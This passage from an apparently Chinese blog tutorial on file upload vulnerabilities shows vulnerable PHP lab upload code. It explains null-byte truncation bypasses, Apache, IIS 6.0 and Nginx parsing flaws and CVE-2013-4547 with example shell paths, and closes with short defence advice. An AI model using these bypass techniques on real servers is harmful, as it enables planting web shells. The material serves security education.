        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre>
<ul><li>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</li></ul>
<pre><code class="prism language-php"><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
</code></pre>
<ul><li><strong>第二种：</strong> <code>对应upland第19题</code></li><li><strong>前提条件：</strong> PHP版本 &lt; 5.34 、php的magic_quotes_gpc为OFF状态</li><li><strong>源码分析：</strong></li></ul>
<pre><code class="prism language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'禁止保存为该类型文件！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre>
<ul><li>发现<code>move_uploaded_file()函数</code>中的<code>img_path</code>是由<code>post参数save_name控制的</code>，因此可以在<code>save_name利用00截断绕过</code>，方法同上</li></ul>
<h3><a id="35__765"></a>3.5 服务器解析漏洞</h3>
<ul><li>解析漏洞,是指中间件(Apache、nginx、iis等)在解析文件时出现了漏洞,从而,黑客可以利用该漏洞实现非法文件的解析。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/202105192330536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h4><a id="351_Apache__771"></a>3.5.1 Apache 解析漏洞</h4>
<ul><li>Apache解析文件规则是<code>从右到左</code>。例如shel.php.gix.ccc，apache会先识别ccc，ccc不被识别，则识别gix，以此类推，最后会被识别为php来运行。</li><li><a href="https://blog.csdn.net/wn314/article/details/77074477?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162143812416780265498323%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=162143812416780265498323&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-77074477.first_rank_v2_pc_rank_v29&amp;utm_term=apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">Apache 解析漏洞</a></li></ul>
<h4><a id="352_IIS60__774"></a>3.5.2 IIS6.0 漏洞</h4>
<ul><li><strong>目录解析 :</strong></li><li>目录名为<code>.asp、.asa、.cer，</code>则目录下的所有文件都会被作为ASP</li><li><code>url/test.asp/shell.jpg</code>会被当作asp脚本运行。</li><li><strong>文件解析 ：</strong></li><li>文件名中分号后不被解析，例如<code>.asp;、.asa;、.cer;。</code></li><li><code>url/test.asp;shell.jpg</code>会被当作asp脚本运行。</li><li><strong>文件类型解析 ：</strong></li><li><code>.asa，.cer，.cdx</code>都会被作为asp文件执行。</li><li><code>url/shell.asa</code>会被作为asp文件执行。</li><li><a href="https://blog.csdn.net/qq_39353923/article/details/83515616?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162143782616780357287697%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=162143782616780357287697&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-83515616.first_rank_v2_pc_rank_v29&amp;utm_term=iis6.0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">IIS 6.0 解析漏洞</a></li></ul>
<h4><a id="353_Nginx__785"></a>3.5.3 Nginx 漏洞</h4>
<ul><li>PHP+nginx默认是以cgi的方式去运行，当用户配置不当，会导致任意文件被当作php去解析。</li><li><strong>利用条件:</strong><br/> 以FastCGl运行<br/> cgi.fix_pathinfo=1(全版本PHP默认为开启)</li><li>例如如果满足上述条件，当你访问<code>url/shell.jpg/shell.php</code>时，<code>shell.jpg</code>会被当作php去执行。</li><li><a href="https://blog.csdn.net/m0_51803069/article/details/109330765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162143795416780271576906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=162143795416780271576906&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109330765.first_rank_v2_pc_rank_v29&amp;utm_term=Nginx%20%E6%BC%8F%E6%B4%9E">Nginx 解析漏洞</a></li></ul>
<h4><a id="354_Nginx_CVE20134547_793"></a>3.5.4 Nginx 文件名逻辑漏洞（CVE-2013-4547）<code>了解</code></h4>
<ul><li>影响版本:Nginx 0.8.41 ~ 1.4.3/1.5.0 ~ 1.5.7</li><li>利用过程:<br/> 上传一个<code>shell.jpg</code>文件，注意最后为空格<br/> 访问<code>url/shell.jpg[Ox20][Ox00].php</code><br/> (两个中括号中的数字是用Burp在Hex界面中更改)</li><li><a href="https://www.cnblogs.com/yuzly/p/11221564.html">漏洞复现参考链接</a></li></ul>
<h2><a id="_802"></a>四、文件上传漏洞防御</h2>
<ul><li>服务端文件扩展名使用白名单检测+文件名重命名</li><li>对文件内容进行检测</li><li>对中间件做安全的配置</li><li>…</li></ul>
<h2><a id="_808"></a>五、作者说</h2>
<ul><li>首先跟各位亲爱的读者朋友道个歉！</li><li>博主最近事情实在是太多了。</li><li>熬夜肝了两周终于将文件上传漏洞这块结束了。</li><li>之前有读者反应说，我写的文章对小白有点儿不太有好，我再认真看过，反思之后决定从文件上传这里重现整理一下我的博文，希望这次之后大家能喜欢。</li><li><code>如果大家对博主还有其他的意见，或者对文章中有那些不明白可以私信博主，博主将尽心尽力为您解决。</code><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210523231435116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></li></ul>
<hr/>
<p>各位路过的朋友，如果觉得可以学到些什么的话，<font color="#dd0000">点个赞</font> 再走吧，欢迎各位路过的大佬评论，指正错误，也欢迎有问题的小伙伴评论留言，私信。</p>
<p>每个小伙伴的关注都是本人更新博客的动力！！！<br/> 请微信搜索【 <font color="#dd0000">在下小黄</font> 】文章更新将在第一时间阅读 ！<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210504213810633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70#pic_center"/></p>
<blockquote>
<p><font color="#dd0000">博客中若有不恰当的地方，请您一定要告诉我。前路崎岖，望我们可以互相帮助，并肩前行！</font></p>
</blockquote>
<hr/>
</div>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
</div>